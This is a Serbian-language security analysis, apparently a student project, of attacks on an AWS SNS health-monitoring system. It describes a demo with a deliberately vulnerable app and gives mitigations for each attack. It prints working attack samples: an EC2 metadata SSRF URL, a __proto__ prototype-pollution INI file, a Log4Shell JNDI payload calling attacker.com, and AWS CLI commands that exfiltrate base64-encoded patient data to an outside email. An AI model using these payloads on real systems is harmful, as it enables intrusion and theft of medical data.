# AWS SNS izveštaj

Analiziran je sistem za zdravstveni monitoring gde IoT uređaji šalju medicinske podatke pacijenata putem AWS SNS (Simple Notification Service) message brokera. Kao bezbednosna pretnja identifikovana je kategorija napada koji ciljaju integritet i dostupnost sistema prema CIA trijadi.

## Stablo napada
<img width="6634" height="1052" alt="mermaid-diagram-2026-02-18-014223" src="https://github.com/user-attachments/assets/8184164c-19f8-4136-9693-f013d6f33cca" />


### Praktično realizovan napad
Sistem se sastoji iz tri kontejnerizovane komponente: LocalStack koji je ustvari lokalna emulacija AWS SNS servisa, ranjive/mitigovane aplikacije implementirane u Rust-u i napadačkih skripti (dos_attack.py i message_injection.py) koje demonstriraju ranjivosti.

- #### Implementacija ranjive aplikacije
    Ranjiva aplikacija ima tri ranjivosti: 
        
        1. endpoint /send-sos prihvata proizvoljan sadržaj custom_message polja bez sanitizacije
        
        2. endpoint /send-bulk nema ograničenje broja poruka
        
        3. /admin/topics endpoint je dostupan svima bez autentifikacije. 
    
    Sve ove ranjivosti klasifikovane su kao CWE-20 (Improper Input Validation), CWE-284 (Improper Access Control), CWE-400 (Uncontrolled Resource Consumption) i CWE-770 (Allocation of Resources Without Limits).

- #### Implementacija napada
    Napad za message injection šalje HTTP POST zahteve na /send-sos endpoint sa proizvoljnim sadržajem u custom_message polju. Pošto sistem nema autentifikaciju, napadač bez ikakvih kredencijala može direktno da pozove API. Lažne poruke se šalju svim SMS pretplatnicima napadnute teme što može dovesti do nepotrebnih medicinskih intervencija ili zanemarivanja pravih upozorenja.

    DoS Message Flooding kreira 10 niti i svaka od njih šalje po 100 zahteva, odnosno ukupno se šalje 1000 zahteva. Svaki zahtev poziva /send-sos endpoint sa spam podacima. Pored toga, /send-bulk endpoint prihvata count parametar bez ograničenja, što omogućava slanje desetina hiljada poruka jednim zahtevom. Posledice napada su preopterećenje SNS servisa, iscrpljivanje AWS SMS kvota i troškova, gušenje pravih medicinskih upozorenja i smanjenje performansi servera. Napad spada u CWE-400 i CWE-770 prema MITRE terminologiji.

- #### Implementacija mitigovane aplikacije
    Mitigovana aplikacija dodaje JWT autentifikaciju, ograničenje veličine zahteva, validaciju opsega vrednosti, template za poruke, validaciju formata ID-ja pacijenta i dodaje logovanje. Na ovaj način pokretanje napada za denial of service rezultuje sa odgovorom 401 za svaki zahtev, a message injection više ne može da injektuje zbog toga što to polje nije deo API interfejsa aplikacije. 

- #### Video demonstracija
    
    https://github.com/user-attachments/assets/63b69a47-79df-4504-868d-93d60af80287
  
    https://github.com/user-attachments/assets/868f60b1-a432-4650-a0c2-d40a50a79579


### Napadi koji nisu realizovani
Preostala tri napada iz stabla nisu implementirana u praktičnom delu, ali su teorijski relevantni za potpunu bezbednosnu analizu sistema. Simple notification service je fully managed aws servis tako da ne postoje CVE koji su direktno vezani za sam servis ali su navedeni cwe i rizici u vezi loše konfiguracije.

#### 1. SSRF putem HTTP pretplate

 Ovaj napad ne odgovara jednoj konkretnoj CVE ranjivosti, već predstavlja zloupotrebu legitimnog mehanizma AWS SNS servisa za potvrdu HTTP/HTTPS pretplata. Spada u kategoriju Server-Side Request Forgery (SSRF) napada, klasifikovanu po MITRE ATT&CK kao T1090 i CWE-918, i direktno ugrožava integritet i poverljivost zdravstvenog monitoring sistema.
Mehanizam koji se eksploatiše je sledeći: kada se na SNS topic pretplati HTTP endpoint, AWS SNS automatski šalje HTTP POST zahtev na navedenu URL adresu radi potvrde pretplate. Taj zahtev dolazi sa AWS servera i ne prolazi kroz standardne mrežne zaštite. Napadač koji ima pristup AWS nalogu sa SNS dozvolama može kao endpoint da navede internu adresu unutar VPC mreže, npr adresu internog servisa koji inače nije javno dostupan. AWS SNS će tada inicirati HTTP zahtev prema toj adresi iz sopstvene infrastrukture, efektivno zaobilazeći security grupe i network ACL-ove koji bi inače blokirali spoljašnji pristup tom servisu.

Posebno opasan slučaj je navođenje AWS metadata servisa kao endpoint adrese:
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
AWS SNS će poslati POST zahtev na ovu adresu i u zavisnosti od konfiguracije EC2 instance odgovor može sadržati privremene IAM kredencijale. Napadač zatim može čitati sadržaj poruke koja stiže na napadačev kontrolisani endpoint i iz nje ekstrahovati osetljive podatke. U kontekstu zdravstvenog monitoring sistema, napadač bi mogao da dosegne interne servise koji čuvaju medicinske podatke pacijenata, a koji nisu namenjeni za spoljašnji pristup.

Tok napada odvija se u nekoliko koraka: 
    - napadač se pretplaćuje na SNS topic navodeći internu adresu kao endpoint, 
    - AWS SNS šalje POST zahtev ka ciljanoj adresi i potencijalno vraća osetljive podatke u telu odgovora koji napadač može da pročita
    
Za razliku od klasičnog SSRF-a, ovde napadač ne kontaktira direktno ranjivi server, već zloupotrebljava AWS infrastrukturu kao posrednika. 

Mitigacije uključuju primenu principa najmanje privilegije u IAM politikama i eksplicitnu zabranu sns:Subscribe akcije za neautorizovane korisnike, validaciju endpoint URL-ova pre kreiranja pretplate, primenu VPC endpoint politika koje ograničavaju sa kojih resursa SNS može da komunicira, kao i obaveznu upotrebu IMDSv2 na svim EC2 instancama što značajno otežava ekstrakciju kredencijala kroz ovaj vektor.

#### 2. AWS SDK ranjivost (CVE-2020-28472)

 Ranjivost pogađa @aws-sdk/shared-ini-file-loader pre verzije 1.0.0-rc.9 i aws-sdk pre verzije 2.814.0 i spada u kategoriju Prototype Pollution napada (CWE-1321). Ranjivost nastaje u funkciji `loadSharedConfigFiles` koja parsira INI konfiguracione fajlove bez adekvatne validacije ključeva. INI format dozvoljava definisanje sekcija i ključeva koji, ako se ne sanitizuju, mogu da utiču na JavaScript Object.prototype koji je globalni prototip od kojeg nasleđuju svi JavaScript objekti. Ukoliko napadač može da ubaci maliciozni INI fajl u aplikaciju koja koristi ranjivi AWS SDK, može da postavi proizvoljne vrednosti na Object.prototype, što može izazvati neočekivano ponašanje u celoj aplikaciji, zaobićì bezbednosne provere ili prouzrokovati pad servisa.
  
U kontekstu zdravstvenog monitoring sistema koji koristi AWS SNS, subscriber aplikacija može da učitava AWS konfiguraciju iz INI fajlova. 

Napad funkcioniše tako što napadač konstruiše maliciozni konfiguracioni fajl koji sadrži sekciju sa ključem `__proto__`:
```
ini[default]
region = ap-southeast-1

[__proto__]
polluted = "malicious_value"
```

Kada aplikacija parsira ovaj fajl pozivom `loadSharedConfigFiles`, vrednost `polluted` se propagira na `Object.prototype`, pa postane dostupna svim objektima u procesu. U zavisnosti od konkretne implementacije, ovo može biti iskorišćeno za izmenu logike obrade medicinskih poruka, zaobilaženje autorizacijskih provera ili izazivanje DoS-a. 

Mitigacija je nadogradnja na `aws-sdk >= 2.814.0` i `@aws-sdk/shared-ini-file-loader >= 1.0.0-rc.9`, kao i validacija i sandboxing svih eksternih konfiguracionih fajlova pre parsiranja.

#### 3. Log4Shell ranjivost u subscriber aplikaciji (CVE-2021-44228)

 Ova ranjivost pogađa Apache Log4j 2 biblioteku u verzijama od 2.0-beta9 do 2.14.1 i predstavlja jednu od najozbiljnijih ranjivosti ikad otkrivenih u Java ekosistemu, sa CVSS skorom 10.0. Ranjivost nastaje zbog toga što Log4j 2 procesira poruke koje se loguju kroz JNDI (Java Naming and Directory Interface) lookup mehanizam, koji može da izvrši udaljeni kod. Konkretno, ako se u logovanu poruku umetne string oblika `${jndi:ldap://attacker.com/exploit}`, Log4j će pokušati da kontaktira navedeni LDAP server i preuzme i izvrši Java klasu sa njega, čime napadač postiže Remote Code Execution (RCE) bez ikakvih privilegija.

U kontekstu zdravstvenog monitoring sistema, subscriber aplikacija pisana u Javi koja koristi Log4j 2 za logovanje pristiglih SNS poruka direktno je ranjiva. Napadač koji može da utiče na sadržaj SNS poruke, na primer slanjem lažnih medicinskih podataka sa malicioznim payloadom u polju kao što je `patient_id` ili `device_id`, može da izazove RCE na serveru koji procesira te poruke. 

Napad se odvija u sledećim koracima: 
    - napadač postavlja maliciozni LDAP server i na njemu hostuje Java klasu koja otvara reverse shell, 
    - napadač zatim objavi SNS poruku čiji sadržaj uključuje JNDI lookup string, 
    - subscriber aplikacija loguje poruku, 
    - Log4j kontaktira napadačev LDAP server i preuzima i izvršava malicioznu klasu, čime napadač dobija potpunu kontrolu nad serverom. 
    
Primer payloada koji se ubacuje u poruku:
```
${jndi:ldap://attacker.com:1389/exploit}
```

Mitigacija je nadogradnja na Log4j 2 >= 2.17.1, kao i postavljanje JVM opcije `-Dlog4j2.formatMsgNoLookups=true` kao privremena mera, i validacija svakog polja SNS poruke pre logovanja.

#### 4. Data Exfiltration i Phishing

 Ova kategorija napada ne odgovara jednoj konkretnoj CVE ranjivosti, već predstavlja zloupotrebu legitimnih funkcionalnosti AWS SNS servisa od strane napadača koji su već stekli inicijalni pristup sistemu, što je klasifikovano po MITRE ATT&CK kao T1567 (Exfiltration Over Web Service) i T1530 (Data from Cloud Storage). Napad eksploatiše permisivne IAM politike i odsustvo monitoringa nad SNS API pozivima, a posebno je opasan u okruženjima zdravstvenog monitoringa gde su medicinski podaci pacijenata visoko osetljivi.
Napad se odvija u nekoliko faza:
    - napadač koji je kompromitovao EC2 instancu ili stekao pristup AWS kredencijalima najpre istražuje okruženje i identifikuje SNS topic koji se koristi za distribuciju medicinskih podataka
    - zatim napadač kreira novi SNS topic koji će služiti kao kanal za eksfiltraciju i pretplaćuje spoljašnju email adresu kao subscribera:
    ```
    TOPIC_ARN=$(aws sns create-topic --name "exfil-topic" --query 'TopicArn' --output text)
    aws sns subscribe --topic-arn "$TOPIC_ARN" --protocol email \
      --notification-endpoint "napadac@protonmail.com"
    ```
    - nakon potvrde pretplate, napadač kodira osetljive podatke u Base64 i objavljuje ih na topic, odakle SNS automatski prosleđuje sve poruke na spoljašnji email:
    ```
    BASE64_CONTENT=$(base64 /tmp/patient_data.json)
    aws sns publish --topic-arn "$TOPIC_ARN" --message "$BASE64_CONTENT" \
      --subject "Patient Records"
    ```
    
Posebno opasan aspekt ovog napada je to što se sav saobraćaj odvija unutar AWS infrastrukture i izgleda kao legitiman AWS API poziv, čime zaobilazi tradicionalne mrežne zaštite poput security group-a i network ACL-ova. Pored eksfiltracije, napadač može iskoristiti legitimne SNS subscriptione zdravstvenog sistema za slanje phishing poruka medicinskom osoblju putem emaila ili SMS-a. 

Mitigacije uključuju primenu principa najmanjih privilegija u IAM politikama, ograničavanje SNS Publish i Subscribe akcija samo na poznate resurse, kao i monitoring CloudTrail logova za neobične CreateTopic, Subscribe i Publish akcije.

## Reference
- https://docs.aws.amazon.com/sns/latest/dg/sns-quotas.html
- https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/
- https://nvd.nist.gov/vuln/detail/CVE-2020-28472
- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-1059426
- https://www.elastic.co/security-labs/aws-sns-abuse
- https://gbhackers.com/aws-sns-exploited-for-data-exfiltration/
- https://nvd.nist.gov/vuln/detail/CVE-2020-28472
- https://security.snyk.io/vuln/SNYK-JS-AWSSDK-1059424
- https://github.com/advisories/GHSA-rrc9-gqf8-8rwg
- https://cxsecurity.com/cveshow/CVE-2020-28472/
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance
- https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/
- https://www.elastic.co/security-labs/detecting-log4j2-with-elastic-security
